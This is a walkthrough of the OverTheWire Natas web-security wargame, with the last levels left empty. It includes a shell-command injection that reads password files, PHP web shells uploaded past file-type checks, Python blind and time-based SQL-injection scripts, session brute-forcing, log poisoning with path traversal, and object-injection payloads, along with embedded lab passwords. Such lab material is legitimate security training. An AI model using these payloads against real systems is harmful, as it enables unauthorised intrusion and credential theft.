Level 0
Goal:
You can find the password for the next level on this page.

Solution:
Right click -> View Page Source.

Level 1
Goal:
You can find the password for the next level on this page, but rightclicking has been blocked!

Solution:
Right click -> View Page Source.

Level 2
Goal:
There is nothing on this page

Solution:
Right click -> View Page Source.
Click on the pixel.png
Browse to: http://natas2.natas.labs.overthewire.org/files/
Click on 'users.txt'

Level 3
Goal:
There is nothing on this page

Solution:
Right click -> View Page Source.
Browse to: http://natas3.natas.labs.overthewire.org/robots.txt
Browse to: http://natas3.natas.labs.overthewire.org/s3cr3t/
Click on 'users.txt'

Level 4
Goal:
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" 

Solution:
Set iceweasel to connect to the Internet via manual proxy. (127.0.0.1:8080)
Open Burp Suite and go to the Proxy section with Intercept On.
Refresh the page.
Edit Referer to: http://natas5.natas.labs.overthewire.org/
Forward

Level 5
Goal:
Access disallowed. You are not logged in

Solution:
View Page Info.
Click on Security.
Install Cookies Manager+
Refresh the page.
Open Cookies Manager+ and search for the 'loggedin' cookie.
Edit and set the Content value to 1.
Refresh the page.

Level 6
Goal:
Input secret: 

Solution:
Open 'View sourcecode' in a new tab.
Browse to: natas6.natas.labs.overthewire.org/includes/secret.inc
Copy: FOEIUWGHFEEUHOFUOIU.
Paste into Input box.

Level 7
Goal: 
Home About

Solution: 
Right click -> View Page Source.
Click on 'Home' button.
Browse to: http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

Level 8
Goal: 
Input secret: 

Solution: 
Open 'View sourcecode' in a new tab.
Copy the encoded secret.
Search Google for "reverse hexdump".
Read: http://linuxcommand.org/man_pages/xxd1.html
echo 3d3d516343746d4d6d6c315669563362 | xxd -p -r | rev | base64 -d
Copy/paste result into the 'Input secret' box.

Level 9
Goal: 
Find words containing:  

Solution: 
Open 'View sourcecode' in a new tab.
; pwd
; cat /etc/natas_webpass/natas10

Level 10
Goal: 
For security reasons, we now filter on certain characters

Find words containing: 

Solution: 
Open "View sourcecode" in a new tab.
In the search box: [a-z0-9] /etc/natas_webpass/natas11 #

Level 11
Goal: 
Cookies are protected with XOR encryption

Background color: 

Solution: 
Open "View sourcecode" in a new tab.
Search Google for "xor encryption".
Read: https://en.wikipedia.org/wiki/XOR_cipher
Copy the plain-text in $defaultdata: 
array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
Search for 'data' in Cookie Manager+.
Copy the cipher text in Content: ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaA

Copy and modify the xor_encrypt php code as:

cat > natas11a.php
<?php

$p_text = json_encode(array("showpassword"=>"no", "bgcolor"=>"#ffffff"));
$c_text = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=");

function xor_encrypt($in, $k) {
    $key = $k;
    $text = $in;
    $outText = '';

    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

print xor_encrypt($p_text, $c_text);

?>

php natas11a.php
Copy "qw8J".

cat > natas11b.php
<?php

$p_text = array("showpassword"=>"yes", "bgcolor"=>"#ff0000");
$key = "qw8J";

function xor_encrypt($in, $k) {
    $key = $k;
    $text = $in;
    $outText = '';

    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

print base64_encode(xor_encrypt(json_encode($p_text), $key));

?>

php natas11b.php
In CookiesManager+ edit the Content to: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sQUcIelMK

Refresh page.

Level 12
Goal: 
Choose a JPEG to upload (max 1KB):

Solution: 
Open "View sourcecode" in a new tab.
Search Google for "php execute external program".
Read: http://php.net/manual/en/function.exec.php
vi 12owned.php
<?php echo exec("cat /etc/natas_webpass/natas13"); ?>

Inspect the POST form and change the value from 'jpg' to 'php'.
Upload 12owned.php
Open the link.

Level 13
Goal: 
 For security reasons, we now only accept image files!

Choose a JPEG to upload (max 1KB):

Solution: 
Open "View sourcecode" in a new tab.
Search Google for "exif_imagetype".
Read: http://php.net/manual/en/function.exif-imagetype.php
Search Google for "jpeg magic number".
Read: http://www.astro.keele.ac.uk/oldusers/rno/Computing/File_magic.html

vi php-jpg-trick.py
# Tricks programs into believing the PHP code is a JPEG.

trick = open('13owned.php', 'w')

trick.write('\xFF\xD8\xFF\xE0' + '<?php echo exec("cat /etc/natas_webpass/natas14"); ?>')

trick.close

python php-jpg-trick.py

Inspect the POST form and change the value from 'jpg' to 'php'.
Upload 13owned.php
Open the link.

Level 14
Goal:
Username: 
Password: 

Solution:
Open "View sourcecode" in a new tab.
In the username field enter: caca" or "1"="1
In the password field enter: caca" or "1"="1
Login

Level 15
Goal:
Username:

Solution:


Open "View sourcecode" in a new tab.
Read: https://www.owasp.org/index.php/Blind_SQL_Injection
Read: http://www.w3schools.com/sql/sql_like.asp
Read: http://dev.mysql.com/doc/refman/5.5/en/cast-functions.html#operator_binary
Read: http://www.w3schools.com/sql/sql_wildcards.asp

cat > 15owned.py
# Library for POST requests and library for Ascii characters.
import string, requests

# All possible characters
all_chars = '0123456789' + string.ascii_lowercase + string.ascii_uppercase

# Parsed characters, the characters that exist in the password
parsed_chars = ''

# Working password
password = ''

# The target URL
target = 'http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/'

# String that says whether we're good
exists = 'This user exists.'

# Verifying we can connect
req = requests.get(target)

if req.status_code != requests.codes.ok:
	raise ValueError('Poof! Unable to connect to target :(')
else:
	print 'Connected to target. Starting character parsing...'

# Verify which characters are part of the working password
for c in all_chars:
	# SQL injection #1
	req = requests.get(target+'?username=natas16" AND password LIKE BINARY "%'+c+'%" "')
	# Verify if password uses character
	if req.content.find(exists) != -1:
		parsed_chars += c
		print 'Chars in pass: ' + parsed_chars

print 'Characters successfully parsed. Starting to brute force...'

# With the assumption passwords are 32 characters long
for i in range(32):
	for c in parsed_chars:
		# SQL injection #2
		req = requests.get(target+'?username=natas16" AND password LIKE BINARY "' + password + c + '%" "')
		# Figuring out characters at the correct position in the pass
		if req.content.find(exists) != -1:
			password += c
			print 'Password: ' + password + '*' * int(32 - len(password))
			break

print 'Successfully brute forced password.'

python 15owned.py

Level 16
Goal:
For security reasons, we now filter even more on certain characters

Find words containing:

Solution:
Open "View sourcecode" in a new tab.
Search Google for "bash command substitution".
Read: https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html
$(foo)

cat > 16owned.py
# Library for Ascii characters and POST requests
import string, requests

# All possible characters
all_chars = '0123456789' + string.ascii_lowercase + string.ascii_uppercase

# Parsed characters, the characers that exist in the working password
parsed_chars = ''

# Working Password
password = ''

# The target URL
target = 'http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/'

# String that says whether we're good
exists = 'Output:\n<pre>\n</pre>'

# Verifying we can connect
req = requests.get(target)
if req.status_code != requests.codes.ok:
        raise ValueError('Poof! Unable to connect to target :(')
else:
        print 'Connected to target. Starting character parsing...'

# Verify which characters are part of the working password
for c in all_chars:
        # Command injection #1
        req = requests.get(target+'?needle=$(grep '+c+' /etc/natas_webpass/natas17)bypassed')
        # Verify if password uses character
        if req.content.find(exists) != -1:
                parsed_chars += c
                print 'Chars in pass: ' + parsed_chars

print 'Characters successfully parsed. Starting to brute force...'

# With the assumption passwords are 32 characters long
for i in range(32):
        for c in parsed_chars:
                # Command injection #2
                req = requests.get(target+'?needle=$(grep ^'+password+c+' /etc/natas_webpass/natas17)bypassed')
                # Figuring out characters at the correct position in the pass
                if req.content.find(exists) != -1:
                        password += c
                        print 'Password: ' + password + '*' * int(32 - len(password))
                        break

print 'Successfully brute-forced password.'

python 16owned.py

Level 17
Goal:
Username: 

Solution:
Open "View sourcecode" in a new tab.
Search Google for "time-based blind sql injection attacks".
Read: http://www.sqlinjection.net/time-based/

cat > 17owned.py
# Library for POST requests and library for Ascii characters.
import string, requests

# All possible characters
all_chars = '0123456789' + string.ascii_lowercase + string.ascii_uppercase

# Parsed characters, the characters that exist in the password
parsed_chars = ''

# Working password
password = ''

# The target URL
target = 'http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/'

# String that says whether we're good
exists = 'This user exists.'

# Verifying we can connect
req = requests.get(target)

if req.status_code != requests.codes.ok:
	raise ValueError('Poof! Unable to connect to target :(')
else:
	print 'Connected to target. Starting character parsing...'

# Verify which characters are part of the working password
for c in all_chars:
        # SQL time-based injection #1
        try:
                r = requests.get(target+'?username=natas18" AND IF(password LIKE BINARY "%'+c+'%", sleep(5), null) %23', timeout=1)
        except requests.exceptions.Timeout:
                # If we get a timeout, the character exists
                parsed_chars += c
                print 'Used chars: ' + parsed_chars

print 'Characters successfully parsed. Starting to brute force...'

# With the assumption password is 32 characters long
for i in range(32):
        for c in parsed_chars:
                # SQL time-based injection #2
                try:
                        r = requests.get(target+'?username=natas18" AND IF(password LIKE BINARY "' + password + c + '%", sleep(5), null) %23', timeout=1)
                # Figuring out characters at the correct position in the password
                except requests.exceptions.Timeout:
                        password += c
                        print 'Password: ' + password + '*' * int(32 - len(password))
                        break

print 'Successfully brute-forced password.'

python 17owned.py

Level 18
Goal:
 Please login with your admin account to retrieve credentials for natas19.
Username:
Password:

Solution:
Open "View sourcecode" in a new tab.
Search Google for "php sessions".
Read: http://php.net/manual/en/session.examples.basic.php
Search Google for "bruteforce php session id".
Click on: https://www.owasp.org/index.php/OWASP_Periodic_Table_of_Vulnerabilities_-_Brute_Force_Session_Identifier
Read: http://projects.webappsec.org/w/page/13246915/Brute%20Force

cat > 18owned.py
# Library for POST requests.
import requests

# Target URL
target = 'http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org/'
# Confirmation we are in.
accept_me = "You are an admin."

# Verifying we can connect.
req = requests.get(target)
if req.status_code != requests.codes.ok:
        raise ValueError('Poof! Unable to connect to target :(')
else:
        print 'Connected to target. Starting session brute force...'

# Iterate each session and check if there's one with admin access
for i in range(1,641):
        if i % 10 == 0:
                print 'Checked '+str(i)+' sessions...'
        cookies = dict(PHPSESSID=str(i))
        req = requests.get(target, cookies=cookies)
        # Did we find the right session?
        if req.content.find(accept_me) != -1:
                print 'Got it! Session='+str(i)
                print req.content
                break
print 'Successfully brute-forced session.'

python 18owned.py

Level 19
Goal:
 This page uses mostly the same code as the previous level, but session IDs are no longer sequential...

Please login with your admin account to retrieve credentials for natas20.
Username:
Password:

Solution:
Open "View sourcecode" in a new tab.
Log in with no credentials, open Cookies Manager+, look at the PHPSESSID and delete it. Do this multiple times. Take note of the changes.
Note that the last two characters are always the same. 0x2D, which is the hex value for '-' in ASCII.
Search Google for "hex values chart".
Read: http://www.asciitable.com/
Note that the rest are numbers. So what we get are three numbers followed by '-', meaning we have a hex-encoded string.
Enter the letter 'a' in the username field and inspect the cookie. Delete and do the same for 'b' and 'c'. 
Recall the 'isValidAdminLogin' function from the previous challenge. It is most likely activated in this level, hence the username is most likely 'admin'.

cat > 19owned.py
# Library for POST requests.
import requests

# Target URL
target = 'http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org/'
# Confirmation we are in.
accept_me = "You are an admin."

# Verifying we can connect.
req = requests.get(target)
if req.status_code != requests.codes.ok:
        raise ValueError('Poof! Unable to connect to target :(')
else:
        print 'Connected to target. Starting session brute force...'

# Iterate each session and check if there's one with admin access.
for i in range(1,641):
        if i % 10 == 0:
                print 'Checked '+str(i)+' sessions...'
	# Try our luck with the discovered '-admin' ending.
        cookies = dict(PHPSESSID=(str(i)+'-admin').encode('hex'))
        req = requests.get(target, cookies=cookies)
        # Did we find the right session?
        if req.content.find(accept_me) != -1:
                print 'Got it! Session='+str(i)
                print req.content
                break
print 'Successfully brute-forced session.'

python 19owned.py

Level 20
Goal:
You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
Your name: 

Solution:
Open "View sourcecode" in a new tab.

Search Google for "php session_set_save_handler".
Read: http://php.net/manual/en/function.session-set-save-handler.php

curl "http://natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF@natas20.natas.labs.overthewire.org?name=admin%0Aadmin%201" --cookie "PHPSESSID=owned"

curl "http://natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF@natas20.natas.labs.overthewire.org" --cookie "PHPSESSID=owned"

Level 21
Goal:  
Note: this website is colocated with http://natas21-experimenter.natas.labs.overthewire.org
You are logged in as a regular user. Login as an admin to retrieve credentials for natas22. 

Solution:
Open "View sourcecode" in a new tab.
Click on the experimenter link.
Open "View sourcecode" in a new tab.
Set iceweasel to connect to the Internet via manual proxy. (127.0.0.1:8080)
Open Burp Suite and go to the Proxy section with Intercept On.
Click the 'Update' button on the experimenter page.
Add '&admin=1' to the end, and copy the PHPSESSID.
Forward.
Refresh the main page, and set the PHPSESSID to what we copied.
Forward.

Level 22
Goal:
A seemingly empty page.

Solution:
Open "View sourcecode" in a new tab.
Set iceweasel to connect to the Internet via manual proxy. (127.0.0.1:8080)
Open Burp Suite and go to the Proxy section with Intercept On.
Add '?revelio=1' to the end of the URL and press enter.
Right-click on the Burp output -> Do intercept -> Response to this request
Forward

Level 23
Goal:
Password: 

Solution:
Open "View sourcecode" in a new tab.
20iloveyou

Level 24
Goal:
Password: 

Solution:
Open "View sourcecode" in a new tab.
Search Google for "strcmp".
Read: http://php.net/manual/en/function.strcmp.php
Search Google for "strcmp vulnerability php".
Read: https://www.owasp.org/index.php/PHP_Security_Cheat_Sheet
Add '?passwd[]=a' to the URL and press enter.

Level 25
Goal:
Quote

You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe, because we, we who don't even exist, we arrange our lives with more order and harmony than God ever arranged the earth. We measure; we plot; we create wonderful new things. We are the architects of our own existence. What a lunatic concept to bow down before a God who slaughters millions of innocent children, slowly and agonizingly starves them to death, beats them, tortures them, rejects them. What folly to even think that we should not insult such a God, damn him, think him out of existence. It is our duty to think God out of existence. It is our duty to insult him. Fuck you, God! Strike me down if you dare, you tyrant, you non-existent fraud! It is the duty of all human beings to think God out of existence. Then we have a future. Because then - and only then - do we take full responsibility for who we are. And that's what you must do, Bubby: think God out of existence; take responsibility for who you are.
Scientist, Bad Boy Bubby

Solution:
Open "View sourcecode" in a new tab.
Set iceweasel to connect to the Internet via manual proxy. (127.0.0.1:8080)
Open Burp Suite and go to the Proxy section with Intercept On.
Click the language button -> de.
Set the User-Agent to: <?php echo file_get_contents('/etc/natas_webpass/natas26') ?>
Set the PHPSESSID to: owned
Set lang GET request to: ....//....//....//....//....//tmp/natas25_owned.log
Right-click on the Burp output -> Do intercept -> Response to this request
Forward

Level 26
Goal:
Draw a line:

Solution:
Open "View sourcecode" in a new tab.
Search Google for "php object injection".
Read: https://www.owasp.org/index.php/PHP_Object_Injection
Copy the 'Logger' class from the sourcecode.

cat > 26owned.php
<?php
    
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="";
            $this->exitMsg="<?php passthru('cat /etc/natas_webpass/natas27');?>";
            $this->logFile = "img/owned.php";
      
            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$initMsg);
            fclose($fd);
        }                       
      
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }                       
      
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }                       
    }
echo base64_encode(serialize(new Logger()));

?>

php 26owned.php
Copy the new cookie.
Set iceweasel to connect to the Internet via manual proxy. (127.0.0.1:8080)
Open Burp Suite and go to the Proxy section with Intercept On.
Type whatever you want on the fields in the website and hit Draw.
Replace the 'drawing' cookie with our new cookie.
Forward.
We'll get an error, but it's fine. Browse to: http://natas26.natas.labs.overthewire.org/img/owned.php

Level 27
Goal:
Username:
Password: 

Solution:
Open "View sourcecode" in a new tab.
Search Google for "mysql_fetch_assoc".
Read: https://dev.mysql.com/doc/apis-php/en/apis-php-function.mysql-fetch-assoc.html
Open Python in a terminal.
"natas28" + (" " * 69) + "owned"
Copy the output (minus the quotes) and paste it in the Username field.
Go back to the index page and enter natas28 in the Username field.

Level 28
Goal:
 Whack Computer Joke Database
Search:
sorry, we are currently out of sauce

Solution:
Right-click -> View Page Source.
Enter in the field: 0
Enter in the field: 1
Enter in the field: 2
Enter in the field: 3
Enter in the field: 4
Enter in the field: <?php echo exec("cat /etc/natas_webpass/natas29"); ?>
Browse to: http://natas28.natas.labs.overthewire.org/search.php/?query=admin
Search Google for "pkcs#7 padding vulnerability".
Read: https://en.wikipedia.org/wiki/Padding_oracle_attack
Search Google for "ecb encryption".
Read: https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation
Search Google for "burp intruder ecb".
Read: http://blog.portswigger.net/2011/10/breaking-encrypted-data-using-burp.html
With search query "a": G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjP
KriAqPE2%2B%2BuYlniRMkobB1
vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
With search query "b": G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjP
IYiwNnSJY7KHJGU%2BXjuMzV
vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
Notice where our query is, the different strings, 
we can directly talk to the application by replacing the string
We can also adjust padding accordingly by reducing characters left to our string


G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPalmost(!)vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D





Level 29
Goal:


Solution:


Level 30
Goal:


Solution:


Level 31
Goal:


Solution:


Level 32
Goal:


Solution:


Level 33
Goal:


Solution:





